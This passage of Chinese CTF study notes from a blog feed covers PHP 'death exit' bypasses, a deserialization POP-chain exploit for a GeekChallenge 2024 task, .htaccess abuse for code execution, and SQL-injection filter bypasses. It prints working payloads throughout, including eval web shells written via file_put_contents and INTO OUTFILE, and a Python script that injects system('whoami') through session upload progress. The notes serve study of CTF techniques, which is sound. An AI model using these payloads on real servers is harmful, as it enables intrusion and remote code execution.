class="string">&#x27;,&#x27;</span>WARD<span class="string">&#x27;,&#x27;</span>JONES<span class="string">&#x27;)),NULL from dual--+s</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="绕过死亡exit"><a href="#绕过死亡exit" class="headerlink" title="绕过死亡exit"></a>绕过死亡exit</h1><p>分三种情况</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>.<span class="string">&quot;\nxxxxxx&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>都是写马，但是很可能在需要的代码执行前被退出或报错中断<br>第一种是文件名和内容都分别可控，<br>第二种要求文件名和内容相同<br>第三种文件名和内容分别可控，但在内容后接入了错误代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里我们的思路一般是想要将杂糅或者死亡代码分解掉；</span><br><span class="line">这里思路基本上都是利用php伪协议filter，</span><br><span class="line">结合编码或者相应的过滤器进行绕过，</span><br><span class="line">其原理不外乎是将死亡或者杂糅代码分解成php无法识别的代码。</span><br><span class="line"></span><br><span class="line">需要注意的是，有时候死亡代码是没有被闭合的，</span><br><span class="line">像是这样：&lt;?php exit();，</span><br><span class="line">出现这种情况的时候，有时绕过需要将死亡代码闭合，</span><br><span class="line">否则会影响后面写入的payload。</span><br></pre></td></tr></table></figure><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><p>各种各样的利用协议进行编码绕过<br>这里记一下下面的两种也可以用</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><h5 id="极客大挑战2024-ezpop"><a href="#极客大挑战2024-ezpop" class="headerlink" title="极客大挑战2024 ezpop"></a>极客大挑战2024 ezpop</h5><p>题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/meimeng/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码，发现:</p><ul><li>漏洞利用点在<code>SYC</code>类的<code>file_put_contents</code>中</li><li>反序列化起始点在<code>lover</code>类</li><li>pop链逻辑为 lover(destruct) -&gt; Geek(get) -&gt; lover(invoke) -&gt; Geek(tostring) -&gt; SYC(call)</li></ul><p>poc如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span> = <span class="string">&quot;php://filter/write=string.strip_tags|?&gt;php_value auto_prepend_file &#x27;/flag&#x27;\n#/resource=.htaccess&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>=<span class="string">&#x27;data://text/plain;base64,V2VsY29tZSBHZWVrQ2hhbGxlbmdlIDIwMjQ=&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP = <span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;abcabc&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s%3A7%3A%22meimeng&#x27;</span>,<span class="string">&#x27;S%3A7%3A%22%5C6deimeng&#x27;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><p>需要注意的绕过点:</p><ul><li>十六进制绕过<code>$meimeng</code>的正则匹配</li><li>伪协议绕过<code>$J1rry</code>的<code>file_get_content</code></li><li>绕过死亡<code>exit</code>的大部分<code>filter</code>被ban，只能使用<code>strip_tags</code>写.htaccess进行文件包含</li></ul><h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>这种情况较为简单，仅仅需要让后面的杂糅代码被注释掉就就可以，<br>针对 php 而言，拥有特殊的起始符和结束符，<br>如果可以写入 php 代码的话，就可以轻易的绕过后面的杂糅代码。<br>正常写入payload即可，比如<?php eval($_POST['hack']);?>，<br>识别到?&gt;自动结束，也就不会受到杂糅代码的影响。</p><p>但是在禁止使用拥有特殊起始符和结束符号的语言时，需要想办法处理掉杂糅的代码。<br>通常利用 .htaccess 进行操作。<br>先写入存在php代码的文件(可以不是php文件)，然后利用.htaccess预包含：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;.htaccess&#x27;</span></span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;php_value auto_prepend_file shell.txt %0a%23\&#x27;</span></span><br></pre></td></tr></table></figure><p>这里的<code>%0a%23</code>用来换行并注释杂糅代码，<code>\</code>用来转义<code>\n</code>使其也被注释，<br>确保<code>.htaccess</code>的编排不会出错，出错的后果就无法执行。</p><h1 id="htaccess利用总结"><a href="#htaccess利用总结" class="headerlink" title=".htaccess利用总结"></a>.htaccess利用总结</h1><p><a href="https://www.anquanke.com/post/id/205098#h3-4">https://www.anquanke.com/post/id/205098#h3-4</a></p><p><a href="https://eastjun.top/posts/htaccess_use/">https://eastjun.top/posts/htaccess_use/</a></p><p><a href="https://www.freebuf.com/vuls/218495.html">https://www.freebuf.com/vuls/218495.html</a></p><h3 id="语法汇总"><a href="#语法汇总" class="headerlink" title="语法汇总"></a>语法汇总</h3><p><strong>一行一条指令</strong>：不需要分号结尾。</p><p><strong>不区分大小写</strong>：<code>RewriteEngine On</code> 和 <code>rewriteengine on</code> 是一样的（但文件名路径可能区分大小写，取决于操作系统）。</p><p><strong>注释</strong>：使用 <code>#</code> 开头。</p><p><strong>生效范围</strong>：它对当前目录 <strong>及其所有子目录</strong> 生效。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 针对 php 文件</span><br><span class="line">&lt;FilesMatch &quot;\.ph.*$&quot;&gt;</span><br><span class="line">    SetHandler text/plain</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"># 仅保护 wp-config.php 不被访问</span><br><span class="line">&lt;Files &quot;wp-config.php&quot;&gt;</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line"># 针对特定模块 (&lt;IfModule&gt;) 这是为了防止报错。</span><br><span class="line"># 意思是：“如果服务器安装了这个模块，才执行里面的代码”。</span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    RewriteEngine On</span><br><span class="line">    # 如果没开伪静态模块，这段代码会被忽略，不会导致 500 错误</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"># 强制 HTTP 跳转到 HTTPS</span><br><span class="line">RewriteEngine On</span><br><span class="line"># 条件：如果 HTTPS 不是 on</span><br><span class="line">RewriteCond %&#123;HTTPS&#125; off</span><br><span class="line"># 规则：跳转到 https://原域名/原路径，[R=301]代表永久跳转，[L]代表这是最后一条规则</span><br><span class="line">RewriteRule ^(.*)$ https://%&#123;HTTP_HOST&#125;/$1 [R=301,L]</span><br><span class="line"></span><br><span class="line">#简单的伪静态 (URL Pretty) 把 product.php?id=123 变成 product/123</span><br><span class="line"># ^product/([0-9]+)$ 意思是匹配 product/后面跟数字</span><br><span class="line"># $1 代表第一个括号里匹配到的内容</span><br><span class="line">RewriteRule ^product/([0-9]+)$ product.php?id=$1 [L]</span><br><span class="line"></span><br><span class="line"># 禁止特定 IP 访问</span><br><span class="line">Require all granted</span><br><span class="line">Require not ip 192.168.1.5</span><br><span class="line"></span><br><span class="line"># 密码保护目录 需要配合一个 .htpasswd 文件（存储加密后的密码）。</span><br><span class="line">AuthType Basic</span><br><span class="line">AuthName &quot;Restricted Area&quot;</span><br><span class="line">AuthUserFile /var/www/site/.htpasswd</span><br><span class="line">Require valid-user</span><br><span class="line"></span><br><span class="line"># 禁止目录列表</span><br><span class="line">Options -Indexes</span><br><span class="line"></span><br><span class="line"># 自定义错误页面</span><br><span class="line">ErrorDocument 404 /404.html</span><br><span class="line">ErrorDocument 500 /500.html</span><br><span class="line"></span><br><span class="line"># 默认首页设置</span><br><span class="line">DirectoryIndex index.php index.html home.htm</span><br><span class="line"></span><br><span class="line"># 浏览器缓存</span><br><span class="line">&lt;IfModule mod_expires.c&gt;</span><br><span class="line">    ExpiresActive On</span><br><span class="line">    ExpiresByType image/jpg &quot;access plus 1 year&quot;</span><br><span class="line">    ExpiresByType text/css &quot;access plus 1 month&quot;</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>符号</strong></th><th><strong>含义</strong></th><th><strong>例子</strong></th></tr></thead><tbody><tr><td><code>^</code></td><td>字符串<strong>开头</strong></td><td><code>^admin</code> 匹配以 admin 开头的路径</td></tr><tr><td><code>$</code></td><td>字符串<strong>结尾</strong></td><td><code>.php$</code> 匹配以 .php 结尾的文件</td></tr><tr><td><code>.</code></td><td>任意<strong>单个</strong>字符</td><td><code>b.t</code> 匹配 bat, bot, bit…</td></tr><tr><td><code>*</code></td><td>前面的字符重复 0 次或多次</td><td><code>.*</code> 匹配所有内容 (万能通配符)</td></tr><tr><td><code>+</code></td><td>前面的字符重复 1 次或多次</td><td><code>a+</code> 匹配 a, aa, aaa…</td></tr><tr><td><code>?</code></td><td>前面的字符出现 0 次或 1 次</td><td><code>https?</code> 匹配 http 和 https</td></tr><tr><td><code>()</code></td><td><strong>捕获组</strong> (用于提取内容)</td><td><code>(abc)</code> 可以在后面用 <code>$1</code> 引用它</td></tr><tr><td><code>[]</code></td><td>字符集合</td><td><code>[0-9]</code> 匹配任意数字</td></tr><tr><td><code>!</code></td><td>非 (取反)</td><td><code>!^index\.php</code> 不匹配 index.php</td></tr></tbody></table><h3 id="使文件解析为php"><a href="#使文件解析为php" class="headerlink" title="使文件解析为php"></a>使文件解析为php</h3><p>最常见的利用，可以使任意后缀的文件被解析为php</p><p>使当前目录以及子目录所有文件作为php解析：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>指定后缀名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>指定单个文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;shell.jpg&quot;</span><br></pre></td></tr></table></figure><p>这里的文件内容必须是完整的php文件格式，可以是正常标签也可以是短标签</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>还可以使用伪协议：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//&lt;?php system(&#x27;whoami&#x27;); ?&gt;</span></span><br><span class="line">PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=shell.jpg&quot;</span><br></pre></td></tr></table></figure><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler text/plain</span><br><span class="line"></span><br><span class="line">#或者</span><br><span class="line">&lt;FilesMatch &quot;\.ph.*$&quot;&gt;</span><br><span class="line">  SetHandler text/plain</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h3 id="直接命令执行"><a href="#直接命令执行" class="headerlink" title="直接命令执行"></a>直接命令执行</h3><p>条件：<code>AllowOverride All</code>或上传目录可用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Content-<span class="built_in">type</span>: text/html</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /flag</span><br></pre></td></tr></table></figure><h3 id="使自身可访问-原地写马"><a href="#使自身可访问-原地写马" class="headerlink" title="使自身可访问 &amp; 原地写马"></a>使自身可访问 &amp; 原地写马</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 自身可访问</span><br><span class="line">&lt;Files ~ &quot;^.ht&quot;&gt;</span><br><span class="line">    Require all granted</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line"># 写马</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><h3 id="创造回溯绕过"><a href="#创造回溯绕过" class="headerlink" title="创造回溯绕过"></a>创造回溯绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/admin/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;检测到非法字符！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;欢迎你，&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;input&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有对发生错误的情况进行处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure><h3 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3><h5 id="关键字绕过-反斜杠-换行"><a href="#关键字绕过-反斜杠-换行" class="headerlink" title="关键字绕过(反斜杠+换行)"></a>关键字绕过(反斜杠+换行)</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddT\</span><br><span class="line">ype application/x-httpd-php .abc</span><br></pre></td></tr></table></figure><h5 id="内容绕过"><a href="#内容绕过" class="headerlink" title="内容绕过"></a>内容绕过</h5><p>除了上面说过的filter+编码</p><p>还能直接指定文件本身的编码为utf-7，utf-16等等：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .aaa</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><p>可以用cyberchef</p><h5 id="脏数据处理"><a href="#脏数据处理" class="headerlink" title="脏数据处理"></a>脏数据处理</h5><p>使用反斜杠转义换行实现多行注释</p><p>也可以使用%00实现注释</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddT\</span><br><span class="line">ype application/x-httpd-php .abc #\</span><br><span class="line">asdf\</span><br><span class="line">asdf</span><br><span class="line"></span><br><span class="line"># 相当于</span><br><span class="line">AddType application/x-httpd-php .abc #asdfasdf</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data = urldecode(&#x27;AddType application/x-httpd-php .abc%0a%00asdf&#x27;);</span><br><span class="line">file_put_contents(&#x27;.htaccess&#x27;, $data);</span><br></pre></td></tr></table></figure><h5 id="session绕过其它字符限制"><a href="#session绕过其它字符限制" class="headerlink" title="session绕过其它字符限制"></a>session绕过其它字符限制</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file &quot;/tmp/sess_gtfly&quot;</span><br><span class="line">php_value session.save_path &quot;/tmp&quot;</span><br><span class="line">php_flag session.upload_progress.cleanup off</span><br></pre></td></tr></table></figure><p>只需要使其自动添加一段session即可:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1/test.php&#x27;</span></span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>:<span class="string">&#x27;PHPSESSID=gtfly&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&quot;upload&quot;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&#x27;&#x27;&#x27;&lt;?php echo system(&#x27;whoami&#x27;); ?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line">r.post(url,files=files,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line">t = r.get(<span class="string">&#x27;http://127.0.0.1/test.php&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload </tag>
            
            <tag> lfi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入补课</title>
      <link href="/2025/06/06/sql-plus/"/>
      <url>/2025/06/06/sql-plus/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL补课"><a href="#SQL补课" class="headerlink" title="SQL补课"></a>SQL补课</h1><p>文章来自友链<code>kirakiraayu</code><br>自己对着重新<del>抄写</del>学习了一遍</p><h1 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h1><ul><li>读文件使用<code>load_file()</code>函数<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(&quot;E:\\flag.txt&quot;);</span><br></pre></td></tr></table></figure></li><li>写文件使用<code>into outfile</code><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>,<span class="number">3</span> <span class="keyword">into</span> outfile &quot;/var/www/html/shell.php&quot;;</span><br></pre></td></tr></table></figure></li></ul><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><ul><li><h3 id="xpath报错注入（extractvalue和updatexml）"><a href="#xpath报错注入（extractvalue和updatexml）" class="headerlink" title="xpath报错注入（extractvalue和updatexml）"></a>xpath报错注入（extractvalue和updatexml）</h3></li></ul><p>updatexml（）</p><p>extractvalue（）</p><p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错</p><ul><li>updatexml（）函数<ul><li><p><code>updatexml()</code>是一个使用不同的xml标记匹配和替换xml块的函数。</p></li><li><p>作用：改变文档中符合条件的节点的值</p></li><li><p>语法： <code>updatexml(XML_document，XPath_string，new_value)</code> 第一个参数：是<code>string</code>格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如<code>//title【@lang】</code> 第三个参数：<code>string</code>格式，替换查找到的符合条件的数据</p></li><li><p>updatexml使用时，当<code>xpath_string</code>格式出现错误，mysql则会爆出xpath语法错误<code>(xpath syntax)</code></p></li><li><p>例如： <code>select * from test where ide = 1 and (updatexml(1,0x7e,3));</code>由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</p></li></ul></li></ul><h1 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h1><p>示例语句：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(schema_name) <span class="keyword">FROM</span> information_schema.schemata;</span><br></pre></td></tr></table></figure><ul><li><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3></li></ul><p>可以使用括号包裹</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>(GROUP_CONCAT(schema_name))<span class="keyword">FROM</span>(information_schema.schemata);</span><br></pre></td></tr></table></figure><p>内联注释<code>/**/</code>可以代替空格</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span><span class="comment">/**/</span>GROUP_CONCAT(schema_name)<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>information_schema.schemata;</span><br></pre></td></tr></table></figure><p>符号代替空格的方式(urlencode)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0D Carriage Return，回车 代替空格</span><br><span class="line">%0A Line Feed，换行 代替空格</span><br><span class="line">%0C Form Feed，换页 代替空格</span><br><span class="line">%09 Horizontal Tab，水平制表 代替空格</span><br><span class="line">%0B Vertical Tab，垂直制表 代替空格</span><br><span class="line">%A0 Non-breaking space (MySQL only)，不间断空格 代替空格</span><br></pre></td></tr></table></figure><p>使用反引号包裹变量名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>(GROUP_CONCAT(schema_name))<span class="keyword">FROM</span>`information_schema`.`schemata`;</span><br></pre></td></tr></table></figure><ul><li><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3></li></ul><p>同时查询用户名和密码的情况下：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1\&#x27;</span> <span class="keyword">AND</span> passwd<span class="operator">=</span><span class="string">&#x27; UNION SELECT 1,2,3--&#x27;</span> </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1\&amp;passwd=UNION SELECT 1,2,3--</span><br></pre></td></tr></table></figure><p>这样实际上第二个引号被转义掉了<br>那么密码的部分直接输入<code>&lt;联合注入语句&gt;</code>+<code>&lt;注释&gt;</code>即可</p><p>也可以十六进制编码：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x616263</span>;  # abc</span><br></pre></td></tr></table></figure><p>自动变成字符串</p><ul><li><h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3></li></ul><p>例如需要多列查询时：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>使用<code>join</code>:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>) <span class="keyword">AS</span> a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>) <span class="keyword">AS</span> b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>) <span class="keyword">AS</span> c;</span><br></pre></td></tr></table></figure><p>盲注常用的 <code>substring()</code> <code>substr()</code> <code>mid()</code> 